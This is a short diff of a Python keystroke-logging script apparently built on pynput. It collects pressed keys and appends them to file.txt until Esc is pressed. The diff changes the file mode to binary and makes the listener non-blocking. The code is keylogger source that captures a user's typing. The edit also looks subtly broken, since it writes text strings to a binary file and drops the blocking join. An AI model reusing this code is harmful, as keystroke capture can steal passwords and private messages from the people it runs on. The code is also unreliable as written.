@@ -19,7 +19,7 @@ def clicked(key):
         keys=[]
 
 def write_file(keys):
-    with open("file.txt", "a") as f:
+    with open("file.txt", "ab") as f:
         for key in keys:
             f.write(str(key))
 
@@ -27,10 +27,7 @@ def release(key):
     if key==Key.esc:
         return False
 def listen_to_keyboard():
-
-    with Listener(on_press=clicked, on_release=release) as listener:
-
-        listener.join()
-
+    listener=Listener(on_press=clicked,on_release=release)
+    listener.start()
 
 
